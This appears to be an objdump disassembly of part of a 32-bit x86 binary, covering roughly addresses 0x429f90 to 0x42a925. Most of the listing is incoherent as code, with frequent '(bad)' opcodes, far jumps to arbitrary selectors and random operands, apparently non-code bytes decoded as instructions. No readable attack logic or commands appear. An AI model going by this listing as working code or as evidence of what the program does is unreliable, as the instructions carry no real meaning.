  429f90:	dec    ecx
  429f91:	push   edi
  429f92:	or     BYTE PTR ss:[edx-0x49],dh
  429f96:	xlat   BYTE PTR ds:[ebx]
  429f97:	mov    al,0x75
  429f99:	push   ebx
  429f9a:	sub    DWORD PTR [esi],0x45
  429f9d:	sar    BYTE PTR gs:[edi],cl
  429fa0:	test   DWORD PTR [edx-0x729800de],ebp
  429fa6:	aad    0x77
  429fa8:	push   ss
  429fa9:	daa    
  429faa:	sbb    eax,0x24d0f29e
  429faf:	es dec edx
  429fb1:	add    eax,0x1ae54710
  429fb6:	jp     0x429f6d
  429fb8:	in     al,0x33
  429fba:	shl    DWORD PTR [esi],1
  429fbc:	add    ebx,0xffffffc3
  429fbf:	scas   al,BYTE PTR es:[edi]
  429fc0:	ds loope 0x42a02d
  429fc3:	dec    edx
  429fc4:	push   cs
  429fc5:	dec    ebp
  429fc6:	or     BYTE PTR [edi-0x2],0xa0
  429fca:	dec    ebx
  429fcb:	dec    DWORD PTR [edx-0x7847217e]
  429fd1:	test   BYTE PTR [esi-0x57bd8a7],dl
  429fd7:	sahf   
  429fd8:	dec    eax
  429fd9:	and    ebp,DWORD PTR [edi+0x3e78732]
  429fdf:	pop    ecx
  429fe0:	sub    edi,DWORD PTR [edx]
  429fe2:	cmc    
  429fe3:	xchg   esp,eax
  429fe4:	pusha  
  429fe5:	sar    edx,1
  429fe7:	push   DWORD PTR ds:0x612713b1
  429fed:	cmp    DWORD PTR ds:0x647965ba,edi
  429ff3:	fmul   DWORD PTR [ebx]
  429ff5:	jb     0x429f7c
  429ff7:	repnz cmp BYTE PTR [ebx],al
  429ffa:	push   ecx
  429ffb:	bound  edi,QWORD PTR [ebp-0x24cdade5]
  42a001:	call   0x8d34:0x436a0719
  42a008:	jns    0x429f99
  42a00a:	sbb    al,BYTE PTR [edx]
  42a00c:	fcom   QWORD PTR [ebp+0x2e3b4ac8]
  42a012:	jg     0x429fd2
  42a014:	lods   eax,DWORD PTR ds:[esi]
  42a015:	out    dx,eax
  42a016:	cmp    esp,ebx
  42a018:	popa   
  42a019:	push   ss
  42a01a:	ins    DWORD PTR es:[edi],dx
  42a01b:	and    bh,bl
  42a01d:	les    edx,FWORD PTR [edi+0x69]
  42a020:	push   0x5a
  42a022:	loop   0x42a008
  42a024:	jl     0x42a075
  42a026:	call   0xce97:0xcb6456f7
  42a02d:	pusha  
  42a02e:	dec    esp
  42a02f:	lods   eax,DWORD PTR ds:[esi]
  42a030:	popf   
  42a031:	cmp    eax,0xd8159e08
  42a036:	xchg   esp,eax
  42a037:	inc    ecx
  42a038:	mov    dh,0xeb
  42a03a:	mov    ah,0x2
  42a03c:	bnd js 0x42a023
  42a03f:	add    edi,DWORD PTR [ebx-0x63]
  42a042:	adc    DWORD PTR [ebx+0x15],edx
  42a045:	stos   BYTE PTR es:[edi],al
  42a046:	dec    eax
  42a047:	je     0x42a0a6
  42a049:	shl    BYTE PTR [ecx],cl
  42a04b:	enter  0xea9f,0x9e
  42a04f:	inc    ecx
  42a050:	(bad)  
  42a051:	(bad)  
  42a052:	add    ah,ah
  42a054:	and    eax,0x7bcd4a9e
  42a059:	fld    QWORD PTR [ecx]
  42a05b:	mov    al,0x9c
  42a05d:	pop    ebx
  42a05e:	(bad)  
  42a05f:	stos   DWORD PTR es:[edi],eax
  42a060:	jmp    0x429ffa
  42a062:	je     0x42a060
  42a064:	in     eax,0xc3
  42a066:	jb     0x42a06b
  42a068:	nop
  42a069:	push   eax
  42a06a:	jle    0x42a01a
  42a06c:	mov    dh,0xb3
  42a06e:	mov    WORD PTR [edx],ds
  42a070:	in     eax,dx
  42a071:	fadd   QWORD PTR [eax+0x3f714f50]
  42a077:	lods   al,BYTE PTR ds:[esi]
  42a078:	mov    BYTE PTR [ebp+ebx*8-0x24],dh
  42a07c:	inc    BYTE PTR [edi-0x15c705ef]
  42a082:	aas    
  42a083:	popa   
  42a084:	jmp    0xd009:0xb852a558
  42a08b:	pop    eax
  42a08c:	(bad)  
  42a08d:	inc    ecx
  42a08e:	push   esp
  42a08f:	sar    ecx,cl
	...
  42a0f1:	add    BYTE PTR [eax],al
  42a0f3:	add    bh,dl
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	sub    ax,0xa489
  42a104:	js     0x42a0c8
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    eax,0xe7000001
  42a10d:	out    0x62,al
  42a10f:	stos   BYTE PTR es:[edi],al
  42a110:	mov    BYTE PTR [ebx],bl
  42a112:	adc    eax,eax
  42a114:	inc    eax
  42a115:	adc    DWORD PTR [edx+0x53cef905],0x59
  42a11c:	and    al,0x6
  42a11e:	test   al,0xbf
  42a120:	fnsave [eax+0x60]
  42a123:	dec    esp
  42a124:	stos   BYTE PTR es:[edi],al
  42a125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a126:	jae    0x42a198
  42a128:	add    bl,BYTE PTR [esi-0x3b]
  42a12b:	jae    0x42a132
  42a12d:	out    0x34,al
  42a12f:	das    
  42a130:	pop    edx
  42a131:	outs   dx,DWORD PTR ds:[esi]
  42a132:	mov    ch,0x9a
  42a134:	mov    cl,BYTE PTR [esi+0x458b5541]
  42a13a:	push   edx
  42a13b:	jg     0x42a12d
  42a13d:	push   ds
  42a13e:	push   ecx
  42a13f:	add    ebp,0xffffff92
  42a142:	bound  edx,QWORD PTR [edi+0x5a1b7633]
  42a148:	jne    0x42a11e
  42a14a:	and    al,0xb0
  42a14c:	inc    edi
  42a14d:	and    eax,0x97e3e497
  42a152:	fimul  DWORD PTR [ebx-0x2f951cef]
  42a158:	shr    DWORD PTR [ebp+0x7d],cl
  42a15b:	or     edi,ebx
  42a15d:	fcom   QWORD PTR [edi-0x53]
  42a160:	inc    esp
  42a161:	jmp    0xf746:0xf5a9ea4f
  42a168:	out    dx,eax
  42a169:	cs xchg bh,al
  42a16c:	mov    ?,WORD PTR [edx-0x61]
  42a16f:	pop    edx
  42a170:	imul   al
  42a172:	scas   eax,DWORD PTR es:[edi]
  42a173:	fcom   st(1)
  42a175:	mul    DWORD PTR [ebp+ebp*8+0x66dbf96e]
  42a17c:	push   0x49
  42a17e:	ins    DWORD PTR es:[edi],dx
  42a17f:	adc    BYTE PTR [edi+0x1b],cl
  42a182:	jo     0x42a198
  42a184:	jnp    0x42a1ce
  42a186:	std    
  42a187:	daa    
  42a188:	add    BYTE PTR [eax],dl
  42a18a:	xchg   DWORD PTR [ecx-0x15],ebp
  42a18d:	mov    ch,0xad
  42a18f:	test   esi,edi
  42a191:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  42a193:	jg     0x42a17c
  42a195:	cwde   
  42a196:	bound  edi,QWORD PTR ss:[eax-0x11a77d3b]
  42a19d:	(bad)
  42a1a1:	push   esi
  42a1a2:	dec    ecx
  42a1a3:	bnd jae 0x42a1d6
  42a1a6:	mov    ecx,0xc39b4af2
  42a1ab:	test   eax,0x1ada721d
  42a1b0:	test   BYTE PTR [esi-0x50],dh
  42a1b3:	mov    esp,0x7918079c
  42a1b8:	out    0x40,eax
  42a1ba:	int3   
  42a1bb:	jg     0x42a17d
  42a1bd:	xchg   esp,eax
  42a1be:	pop    esp
  42a1bf:	(bad)  
  42a1c0:	lea    ebx,[eax-0x1321e08d]
  42a1c6:	jmp    0xfd41:0xde4bc71d
  42a1cd:	rcl    DWORD PTR es:[eax-0x2c662db1],0x6b
  42a1d5:	inc    ecx
  42a1d6:	je     0x42a231
  42a1d8:	ins    DWORD PTR es:[edi],dx
  42a1d9:	dec    esp
  42a1da:	jp     0x42a214
  42a1dc:	mov    edx,DWORD PTR [esi+0x2cb3f394]
  42a1e2:	sub    DWORD PTR [ebp-0x48],0x196250ed
  42a1e9:	(bad)  
  42a1ea:	and    BYTE PTR [edx],dh
  42a1ec:	inc    ebp
  42a1ed:	ds ins DWORD PTR es:[edi],dx
  42a1ef:	and    eax,0x3dec6787
  42a1f4:	pop    ecx
  42a1f5:	test   DWORD PTR ss:[ebp+0x38],ecx
  42a1f9:	push   ds
  42a1fa:	add    bh,BYTE PTR [ebx]
  42a1fc:	repnz jecxz 0x42a17f
  42a1ff:	sbb    BYTE PTR [ebx],ch
  42a201:	out    dx,al
  42a202:	xor    edi,ecx
  42a204:	rol    dl,cl
  42a206:	test   al,0xee
  42a208:	clc    
  42a209:	cmp    DWORD PTR [ebx+ebx*4],0xa846b7e9
  42a210:	and    DWORD PTR [eax],eax
	...
  42a272:	add    BYTE PTR [eax],al
  42a274:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a27a:	scas   eax,DWORD PTR es:[edi]
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	(bad)  [ebx+0x49]
  42a282:	mov    esi,0x1c37de0
  42a287:	add    BYTE PTR ds:0x94000001,al
  42a28d:	xchg   edi,eax
  42a28e:	add    al,0x59
  42a290:	test   al,0xfe
  42a292:	ret    
  42a293:	mov    ebx,0xbd2286f7
  42a298:	mov    al,0xe7
  42a29a:	push   0x225093e6
  42a29f:	leave  
  42a2a0:	and    DWORD PTR [ebp+0x8],edx
  42a2a3:	(bad)  
  42a2a4:	xor    eax,0xf7b32334
  42a2a9:	and    esi,DWORD PTR [eax]
  42a2ab:	(bad)  
  42a2ac:	jp     0x42a255
  42a2ae:	xchg   DWORD PTR [esi],edi
  42a2b0:	add    ch,BYTE PTR [ecx+ebx*1+0x5c]
  42a2b4:	inc    esp
  42a2b5:	sbb    DWORD PTR [ebx+0x2b],eax
  42a2b8:	nop
  42a2b9:	xchg   ebp,eax
  42a2ba:	sbb    esi,DWORD PTR [ebp+0x6f]
  42a2bd:	adc    BYTE PTR [edx-0x59],ch
  42a2c0:	loop   0x42a258
  42a2c2:	rep lods eax,DWORD PTR es:[esi]
  42a2c5:	and    DWORD PTR [eax+0x3250aae4],esp
  42a2cb:	mov    ebx,0x99107f81
  42a2d0:	and    WORD PTR [eax+0x30],di
  42a2d4:	jp     0x42a303
  42a2d6:	mov    cl,0x62
  42a2d8:	pop    ebx
  42a2d9:	not    DWORD PTR [edx]
  42a2db:	mov    esp,0xbb5f9f4b
  42a2e0:	mov    bl,0x98
  42a2e2:	imul   eax,DWORD PTR [edx],0x27
  42a2e5:	std    
  42a2e6:	jmp    0x7c69308c
  42a2eb:	div    ebx
  42a2ed:	and    al,BYTE PTR [edi]
  42a2ef:	push   ebp
  42a2f0:	dec    edx
  42a2f1:	sub    BYTE PTR [esi],dl
  42a2f3:	mov    bh,0xbe
  42a2f5:	mov    esp,0x95dc93e5
  42a2fa:	push   edi
  42a2fb:	(bad)  
  42a2fc:	sub    edi,DWORD PTR [edi-0x67]
  42a2ff:	add    DWORD PTR [ebp+0x4],ebx
  42a302:	pop    edi
  42a303:	mov    al,ds:0x23ad88e4
  42a308:	test   BYTE PTR [ebx-0x3c],cl
  42a30b:	jnp    0x42a34f
  42a30d:	jmp    0x42a36e
  42a30f:	cmp    eax,0x802aa17d
  42a314:	clc    
  42a315:	mov    bh,0xb7
  42a317:	je     0x42a2a9
  42a319:	gs lock mov ebx,0xcf63a4aa
  42a320:	fistp  WORD PTR [ebp+0x2f263c9]
  42a326:	mov    BYTE PTR [eax+0x17],dh
  42a329:	stos   BYTE PTR es:[edi],al
  42a32a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a32b:	je     0x42a2f3
  42a32d:	mov    ds:0x81af0e22,al
  42a332:	ret    
  42a333:	mov    edx,0x31cd1405
  42a338:	(bad)  
  42a339:	cdq    
  42a33a:	inc    eax
  42a33b:	neg    DWORD PTR [ebp+0x3e]
  42a33e:	add    BYTE PTR ss:[ebp+0x7d92c398],bl
  42a345:	jmp    0x94868962
  42a34a:	sbb    BYTE PTR [edx],0xf3
  42a34d:	push   0xffffffd8
  42a34f:	(bad)  
  42a350:	add    ah,bh
  42a352:	data16 fisubr WORD PTR [eax-0x4ff00b3a]
  42a359:	xchg   ecx,eax
  42a35a:	imul   DWORD PTR [ebx-0x2a]
  42a35d:	push   es
  42a35e:	imul   ecx,DWORD PTR [edx-0x62a62bc1],0xffffffc8
  42a365:	out    dx,al
  42a366:	js     0x42a3b5
  42a368:	arpl   WORD PTR [eax],bp
  42a36a:	leave  
  42a36b:	clc    
  42a36c:	xchg   DWORD PTR [edx-0x45],esi
  42a36f:	and    dh,0x56
  42a372:	imul   ebx,DWORD PTR [esp+edx*8+0x18807f11],0xe20af6b2
  42a37d:	adc    al,0x68
  42a37f:	jg     0x42a3c2
  42a381:	jne    0x42a3e2
  42a383:	into   
  42a384:	(bad)  
  42a385:	xor    al,0x33
  42a387:	mov    eax,0x47de9429
  42a38c:	and    al,0x46
  42a38e:	popf   
  42a38f:	inc    esp
  42a390:	aam    0x0
	...
  42a3f2:	add    BYTE PTR [eax],al
  42a3f4:	jg     0x42a404
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x22c4a73d
  42a403:	gs add ah,0x1
  42a407:	add    BYTE PTR ds:0x66000001,al
  42a40d:	(bad)
  42a410:	icebp  
  42a411:	sub    al,BYTE PTR [ebx]
  42a413:	push   ecx
  42a414:	fcmovne st,st(3)
  42a416:	inc    ebp
  42a417:	adc    cl,BYTE PTR [eax]
  42a419:	add    DWORD PTR ds:0x6a820e1b,ebp
  42a41f:	dec    edi
  42a420:	popa   
  42a421:	or     BYTE PTR [eax],0x8b
  42a424:	pusha  
  42a425:	lea    ecx,[esi+ecx*2+0xa790299]
  42a42c:	xor    ebx,DWORD PTR [edx+eiz*8]
  42a42f:	ret    0xa61
  42a432:	pop    edx
  42a433:	xchg   esp,eax
  42a434:	mov    ds:0xfa0c8aec,al
  42a439:	sar    BYTE PTR [edx-0x11],0xd4
  42a43d:	inc    esp
  42a43e:	in     eax,0x23
  42a440:	hlt    
  42a441:	sbb    DWORD PTR [esi+0x42],ebp
  42a444:	push   es
  42a445:	mov    ebx,0x4f599487
  42a44a:	sar    BYTE PTR [edi+edi*2],1
  42a44d:	dec    esp
  42a44e:	mov    DWORD PTR [ebp-0x273c4efd],ebp
  42a454:	scas   ax,WORD PTR es:[edi]
  42a456:	push   ebp
  42a457:	and    ah,bh
  42a459:	inc    dl
  42a45b:	push   ecx
  42a45c:	dec    esp
  42a45d:	stc    
  42a45e:	xchg   edi,eax
  42a45f:	scas   eax,DWORD PTR es:[edi]
  42a460:	jecxz  0x42a431
  42a462:	push   ebp
  42a463:	pop    esi
  42a464:	mov    ch,0x89
  42a466:	jmp    0x42a43e
  42a468:	ret    0x91c1
  42a46b:	inc    ecx
  42a46c:	(bad)  
  42a46d:	in     al,dx
  42a46e:	ins    BYTE PTR es:[edi],dx
  42a46f:	cmp    DWORD PTR [edi-0x11],0x5a
  42a473:	cmp    eax,0xa13d1843
  42a478:	xchg   ebx,eax
  42a479:	or     dl,BYTE PTR [ebx-0x48de38a1]
  42a47f:	je     0x42a4f2
  42a481:	repz aam 0x24
  42a484:	out    0xa7,al
  42a486:	fsub   QWORD PTR [ecx-0x58]
  42a489:	fwait
  42a48a:	retf   
  42a48b:	sbb    eax,0x3e9ad5bc
  42a490:	dec    eax
  42a491:	xor    ax,0x1c5
  42a495:	imul   ecx,DWORD PTR [ecx-0x3d],0xffffffb1
  42a499:	test   DWORD PTR ds:0xe5bf6395,ebp
  42a49f:	xchg   ebx,eax
  42a4a0:	cld    
  42a4a1:	cdq    
  42a4a2:	mov    bl,cl
  42a4a4:	add    DWORD PTR [eax],0xf664a424
  42a4aa:	leave  
  42a4ab:	aas    
  42a4ac:	cli    
  42a4ad:	cmp    DWORD PTR [ecx],edi
  42a4af:	or     ecx,DWORD PTR [edi]
  42a4b1:	ret    0x15c9
  42a4b4:	jne    0x42a486
  42a4b6:	adc    al,0x82
  42a4b8:	xrelease mov DWORD PTR [ebx+0x1b],eax
  42a4bc:	cmc    
  42a4bd:	dec    ebx
  42a4be:	adc    BYTE PTR [edx+esi*8+0x27d5c2c0],bl
  42a4c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a4c6:	xchg   edi,eax
  42a4c7:	xchg   edx,eax
  42a4c8:	and    ecx,edx
  42a4ca:	or     edx,esi
  42a4cc:	adc    al,0xe4
  42a4ce:	ins    BYTE PTR es:[edi],dx
  42a4cf:	ins    DWORD PTR es:[edi],dx
  42a4d0:	mov    esp,0x601c0b34
  42a4d5:	mov    al,0xc8
  42a4d7:	sbb    eax,0x4d1e94f
  42a4dc:	loope  0x42a4c0
  42a4de:	or     DWORD PTR [ebx-0x1912a9ab],ebx
  42a4e4:	(bad)  
  42a4e5:	out    0xaa,eax
  42a4e7:	dec    edi
  42a4e8:	xlat   BYTE PTR ds:[ebx]
  42a4e9:	out    dx,eax
  42a4ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a4eb:	sub    bl,BYTE PTR [ecx+0x4abb41c1]
  42a4f1:	sub    BYTE PTR [ecx],ah
  42a4f3:	scas   al,BYTE PTR es:[edi]
  42a4f4:	ret    
  42a4f5:	jg     0x42a4de
  42a4f7:	pop    es
  42a4f8:	sub    BYTE PTR [edx+0x16fd1435],cl
  42a4fe:	repz out 0x6f,eax
  42a501:	mov    esp,0xa39293b5
  42a506:	and    al,0x97
  42a508:	sahf   
  42a509:	mov    bl,0x9
  42a50b:	outs   dx,BYTE PTR ds:[esi]
  42a50c:	leave  
  42a50d:	jmp    0xcbe51f
	...
  42a572:	add    BYTE PTR [eax],al
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x8c7ba29f
  42a583:	inc    edx
  42a584:	xchg   ebp,eax
  42a586:	add    DWORD PTR [eax],eax
  42a588:	add    eax,0x42000001
  42a58d:	cli    
  42a58e:	xchg   esp,eax
  42a58f:	xchg   BYTE PTR [ecx],bh
  42a591:	or     bl,bl
  42a593:	mov    bh,0xa0
  42a595:	loop   0x42a5c8
  42a597:	dec    eax
  42a598:	mov    al,0x3a
  42a59a:	repz mov es,WORD PTR [ecx+0xe]
  42a59e:	in     eax,0xd
  42a5a0:	dec    edi
  42a5a1:	push   ss
  42a5a2:	arpl   WORD PTR [edx+0x38c34f03],dx
  42a5a8:	jmp    0x42a5a5
  42a5aa:	lds    edi,FWORD PTR [ecx-0x67]
  42a5ad:	sbb    BYTE PTR es:[ebp+0x64],ah
  42a5b1:	sub    edi,DWORD PTR [eax+ecx*1-0x66d841bc]
  42a5b8:	inc    esi
  42a5b9:	pop    esp
  42a5ba:	daa    
  42a5bb:	push   edi
  42a5bc:	mov    dl,0x63
  42a5be:	pop    ds
  42a5bf:	adc    al,0x35
  42a5c1:	ret    
  42a5c2:	mov    esi,0x4dfeb104
  42a5c7:	lods   eax,DWORD PTR ds:[esi]
  42a5c8:	cmc    
  42a5c9:	add    DWORD PTR [edx+edx*4+0x2a],ebx
  42a5cd:	pop    ds
  42a5ce:	stos   BYTE PTR es:[edi],al
  42a5cf:	repz es push 0x20
  42a5d3:	mov    ah,0x51
  42a5d5:	pop    ebp
  42a5d6:	aad    0x4c
  42a5d8:	aas    
  42a5d9:	test   bh,bl
  42a5db:	lahf   
  42a5dc:	aam    0x84
  42a5de:	cwde   
  42a5df:	and    edi,DWORD PTR [ebp-0x2d]
  42a5e2:	shl    al,1
  42a5e4:	fs pop ss
  42a5e6:	xchg   edx,eax
  42a5e7:	jecxz  0x42a601
  42a5e9:	adc    edi,ecx
  42a5eb:	out    0xac,eax
  42a5ed:	mov    esp,0x7832480f
  42a5f2:	sbb    DWORD PTR [esp+ebp*8-0x75],0x629a9d49
  42a5fa:	push   edi
  42a5fb:	or     BYTE PTR [ebx-0x29],dl
  42a5fe:	shr    BYTE PTR [ecx],1
  42a600:	retf   0xb356
  42a603:	and    ebp,DWORD PTR [ebx]
  42a605:	mov    es,WORD PTR [edx]
  42a607:	mov    esp,0x3f18d621
  42a60c:	add    DWORD PTR [ebp+0x18e67aab],ebx
  42a612:	pop    ds
  42a613:	cs rcl ecx,0x85
  42a617:	pop    edi
  42a618:	mov    esp,0xc4179656
  42a61d:	mov    edx,0xa111105b
  42a622:	fwait
  42a623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a624:	dec    eax
  42a625:	push   edx
  42a626:	sub    eax,eax
  42a628:	test   al,0xd3
  42a62a:	xchg   ebx,eax
  42a62b:	cvtps2pi mm6,QWORD PTR [ecx-0x12e19d38]
  42a632:	sub    DWORD PTR [edi-0x3c],0xffffffcc
  42a636:	rol    bl,0x30
  42a639:	dec    ecx
  42a63a:	aad    0xc9
  42a63c:	or     dl,bl
  42a63e:	mov    ah,0xcf
  42a640:	fwait
  42a641:	cmp    al,0x69
  42a643:	test   al,0x3b
  42a645:	(bad)  
  42a646:	jmp    0x42a5dd
  42a648:	adc    DWORD PTR [edi-0x1d],ebx
  42a64b:	add    BYTE PTR [esi-0x749b1272],ah
  42a651:	inc    edx
  42a652:	xchg   al,dl
  42a654:	add    BYTE PTR [edi],ch
  42a656:	shl    esp,cl
  42a658:	and    esi,DWORD PTR [edi]
  42a65a:	shr    DWORD PTR ds:0x4e4072e1,cl
  42a660:	aad    0x3a
  42a662:	mul    DWORD PTR [ebx-0x64]
  42a665:	mov    ebx,DWORD PTR [edx+0x1d973df2]
  42a66b:	jno    0x42a61e
  42a66d:	leave  
  42a66e:	outs   dx,BYTE PTR ds:[esi]
  42a66f:	jno    0x42a66a
  42a671:	addr16 neg al
  42a674:	add    cl,BYTE PTR [esi+0x5d]
  42a677:	push   es
  42a678:	push   edi
  42a679:	mov    DWORD PTR [ebx-0xf886338],edi
  42a67f:	test   al,0x45
  42a681:	pop    edx
  42a682:	or     eax,0x9eb34906
  42a687:	out    dx,al
  42a688:	add    BYTE PTR [ebp-0x3c],dh
  42a68b:	dec    eax
  42a68c:	jg     0x42a616
  42a68e:	xor    BYTE PTR [ecx],ah
  42a690:	jge    0x42a692
	...
  42a6f2:	add    BYTE PTR [eax],al
  42a6f4:	and    al,0x16
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x6b47ece4],0x8c69171c
  42a705:	mov    BYTE PTR [ecx],0x0
  42a708:	add    eax,0x6000001
  42a70d:	ins    BYTE PTR es:[edi],dx
  42a70e:	push   ebx
  42a70f:	xchg   edi,eax
  42a710:	pusha  
  42a711:	sti    
  42a712:	retf   
  42a713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a714:	repz jb 0x42a776
  42a717:	cs push edi
  42a719:	loopne 0x42a746
  42a71b:	xchg   DWORD PTR [edx],eax
  42a71d:	fst    QWORD PTR [ecx]
  42a71f:	int    0xe8
  42a721:	sub    bl,BYTE PTR [ecx+0x42]
  42a724:	fistp  QWORD PTR [edi]
  42a726:	cmp    eax,0x3a43e610
  42a72b:	pusha  
  42a72c:	shr    bl,cl
  42a72e:	or     BYTE PTR [edi-0x1fb13b05],ah
  42a734:	mov    ebx,DWORD PTR [ebp-0x8d6aa7b]
  42a73a:	pop    edi
  42a73b:	iret   
  42a73c:	xor    BYTE PTR [ebx-0x52c50717],bh
  42a742:	pop    ecx
  42a743:	sub    eax,0x3c8b6d7f
  42a748:	je     0x42a745
  42a74a:	cmp    dh,ch
  42a74c:	add    edi,ecx
  42a74e:	xor    al,0x8f
  42a750:	cmp    al,0xc1
  42a752:	loopne 0x42a7a3
  42a754:	mov    ebx,0x638b1470
  42a759:	fidiv  DWORD PTR [ebx-0x1d]
  42a75c:	pusha  
  42a75d:	inc    esi
  42a75e:	in     al,0xd9
  42a760:	pusha  
  42a761:	hlt    
  42a762:	push   eax
  42a763:	cmc    
  42a764:	xor    bl,BYTE PTR ds:0xadfe8b1b
  42a76a:	or     BYTE PTR [ebx+0x27],ah
  42a76d:	pusha  
  42a76e:	mov    esp,0xbcce33
  42a773:	popa   
  42a774:	push   ebp
  42a775:	cwde   
  42a776:	jne    0x42a7df
  42a778:	jne    0x42a710
  42a77a:	retf   
  42a77b:	xchg   BYTE PTR [ecx-0x5c],bh
  42a77e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a77f:	fist   DWORD PTR [eax+0x5b]
  42a782:	dec    ebx
  42a783:	fsubp  st(3),st
  42a785:	inc    edi
  42a786:	in     al,dx
  42a787:	fcmovb st,st(5)
  42a789:	jmp    DWORD PTR ds:0x46c98af1
  42a78f:	push   esp
  42a790:	idiv   BYTE PTR [eax-0x7b]
  42a793:	sti    
  42a794:	jp     0x42a7ad
  42a796:	cwde   
  42a797:	jmp    0x59f5cc4c
  42a79c:	js     0x42a78c
  42a79e:	leave  
  42a79f:	sub    ebp,DWORD PTR [ecx-0x44ba6b26]
  42a7a5:	int    0x4
  42a7a7:	add    al,0xf6
  42a7a9:	push   ebx
  42a7aa:	dec    esp
  42a7ab:	adc    al,0xc1
  42a7ad:	lock cdq 
  42a7af:	pop    ss
  42a7b0:	sub    eax,0xb9224584
  42a7b5:	retf   0x151f
  42a7b8:	ss pop edx
  42a7ba:	jne    0x42a7e6
  42a7bc:	les    eax,FWORD PTR [edi-0x52]
  42a7bf:	sbb    DWORD PTR ds:0x57ad32eb,eax
  42a7c5:	push   cs
  42a7c6:	mov    BYTE PTR [edi],bh
  42a7c8:	and    DWORD PTR [esi],eax
  42a7ca:	retf   
  42a7cb:	sub    cl,dl
  42a7cd:	fadd   QWORD PTR [ebx]
  42a7cf:	out    0x11,eax
  42a7d1:	cmp    BYTE PTR [esi+ebx*2-0x5e],dl
  42a7d5:	or     dh,BYTE PTR [eax+0x50]
  42a7d8:	inc    bx
  42a7da:	and    ah,bh
  42a7dc:	data16 loop 0x42a776
  42a7df:	jmp    0x17c11a15
  42a7e4:	xor    ecx,DWORD PTR [ebx-0x4db9b366]
  42a7ea:	les    ebp,FWORD PTR [edi-0x94aabf]
  42a7f0:	popf   
  42a7f1:	dec    eax
  42a7f2:	sub    eax,0xbccbb6d1
  42a7f7:	dec    edx
  42a7f8:	xor    eax,ecx
  42a7fa:	xchg   DWORD PTR [edx-0x43a55f4c],ebx
  42a800:	sbb    bh,BYTE PTR [esi+0x788a036b]
  42a806:	jmp    0xd73c468d
  42a80b:	inc    edi
  42a80c:	imul   ebx,DWORD PTR [ecx-0x36],0x59f0
	...
  42a873:	add    BYTE PTR [edx-0x10409c9b],cl
  42a879:	mov    edi,0xc58175de
  42a87e:	xchg   edi,eax
  42a87f:	ins    BYTE PTR es:[edi],dx
  42a880:	ins    DWORD PTR es:[edi],dx
  42a881:	mov    dh,dh
  42a883:	imul   edx,DWORD PTR [ecx+0x50001c7],0x1
  42a88a:	add    BYTE PTR [eax],al
  42a88c:	xor    cl,BYTE PTR es:[edx-0x94043b0]
  42a893:	fiadd  WORD PTR [ebx]
  42a895:	js     0x42a87d
  42a897:	call   0x4ee5e9f3
  42a89c:	bound  edx,QWORD PTR [edi+0x33]
  42a89f:	clc    
  42a8a0:	jmp    0x42a894
  42a8a2:	neg    DWORD PTR [esi+0x3425b46c]
  42a8a8:	outs   dx,DWORD PTR ds:[esi]
  42a8a9:	jmp    0x7da3:0xdc7697ae
  42a8b0:	push   edi
  42a8b1:	rol    DWORD PTR [ebp+edx*8+0x38],cl
  42a8b5:	mov    ds:0x59ac2241,eax
  42a8ba:	inc    edi
  42a8bb:	xchg   esi,eax
  42a8bc:	outs   dx,DWORD PTR ds:[esi]
  42a8bd:	mov    edi,?
  42a8bf:	dec    eax
  42a8c0:	jns    0x42a92c
  42a8c2:	and    al,bl
  42a8c4:	sbb    eax,esi
  42a8c6:	scas   al,BYTE PTR es:[edi]
  42a8c7:	mov    eax,0x85a16c6b
  42a8cc:	jbe    0x42a8b3
  42a8ce:	xchg   ecx,eax
  42a8d0:	sub    bl,BYTE PTR [ecx+0x68c24716]
  42a8d6:	and    BYTE PTR [bp-0x2a83],dl
  42a8db:	rcl    BYTE PTR [ecx-0x2],cl
  42a8de:	loopne 0x42a8d9
  42a8e0:	dec    esi
  42a8e1:	loopne 0x42a892
  42a8e3:	xor    BYTE PTR [edx],bh
  42a8e5:	lods   al,BYTE PTR ds:[esi]
  42a8e6:	aas    
  42a8e7:	xor    edi,DWORD PTR [ebx+0x68]
  42a8ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a8eb:	mov    cl,0xe2
  42a8ed:	add    al,0x9d
  42a8ef:	out    0x28,al
  42a8f1:	ja     0x42a8a0
  42a8f3:	xor    dl,BYTE PTR [edx]
  42a8f5:	shl    BYTE PTR [ecx-0x2aec1fcb],0xc1
  42a8fc:	cwde   
  42a8fd:	stos   DWORD PTR es:[edi],eax
  42a8fe:	fldenv [edi-0x3]
  42a901:	push   0x40e730a7
  42a906:	mov    bh,0xc8
  42a908:	in     eax,0x69
  42a90a:	es dec ebx
  42a90c:	ins    BYTE PTR es:[edi],dx
  42a90d:	lods   al,BYTE PTR ds:[esi]
  42a90e:	jmp    0xcc73:0xe80f1961
  42a915:	adc    DWORD PTR [edi-0x63],ebx
  42a918:	mov    ss,WORD PTR ds:0x156da4e6
  42a91e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a91f:	out    0xe1,al
  42a921:	inc    edx
  42a922:	cld    
  42a923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a924:	popa   
  42a925:	pop    ds
